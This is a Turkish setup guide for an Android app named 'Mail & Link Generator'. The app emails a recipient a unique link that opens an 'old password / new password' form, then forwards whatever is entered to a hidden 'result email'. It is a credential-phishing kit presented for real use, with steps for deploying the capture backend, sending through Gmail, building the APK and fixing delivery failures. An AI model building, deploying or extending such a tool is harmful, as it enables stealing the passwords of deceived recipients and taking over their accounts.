# Mail & Link Generator — Kivy Android Kurulum Rehberi

## Ne Yapıyor?

1. 5 alan doldurulur (Mesaj, Gönderici, Şifre, Alıcı, Sonuç E-postası)
2. Butona basılınca backend'e bir "capture oturumu" kaydedilir ve benzersiz bir link üretilir
3. Alıcıya, linki içeren e-posta gönderilir
4. Alıcı linke tıklayınca "Eski Şifre" ve "Yeni Şifre" formu açılır
5. Form doldurulunca bilgiler **Sonuç E-postası**'na iletilir

---

## Kurulum Adımları

### 1. Domain'i Güncelle

`main.py` dosyasında şu satırı bulun:
```python
BASE_URL = "https://BURAYA_DOMAIN_YAZIN"
```
Bunu Replit'te "Yayınla" (Deploy) yaptıktan sonra aldığınız URL ile değiştirin.
Örnek: `BASE_URL = "https://mail-link-generator.kullaniciadi.replit.app"`

### 2. Gmail Uygulama Şifresi Al

1. Google Hesabı → **Güvenlik**
2. **2 Adımlı Doğrulama**'yı aktif et
3. **Uygulama Şifreleri** → "Uygulama seç: Diğer" → "Mail Link Generator"
4. Üretilen 16 karakterlik şifreyi uygulamada kullan

### 3. PC'de Test Et

```bash
pip install kivy requests
python main.py
```

### 4. Android APK Oluştur (Linux/macOS)

```bash
pip install buildozer
cd kivy_app/
buildozer android debug
```

APK dosyası `bin/` klasöründe oluşur.

### 5. APK'yı Cihaza Yükle

```bash
# USB ile bağlı cihaza yükle
buildozer android deploy run
# VEYA .apk dosyasını telefona kopyalayıp manuel yükle
```

> **Not:** İlk buildozer çalıştırması NDK/SDK indireceği için 10-30 dakika sürebilir.

---

## Sorun Giderme

| Hata | Çözüm |
|------|-------|
| SMTPAuthenticationError | Gmail uygulama şifresi yanlış |
| Bağlantı Hatası | BASE_URL doğru mu? Uygulama deploy edildi mi? |
| E-posta gitmedi | Spam klasörünü kontrol edin |
| BASE_URL uyarısı | `main.py` içinde domain'i güncelleyin |
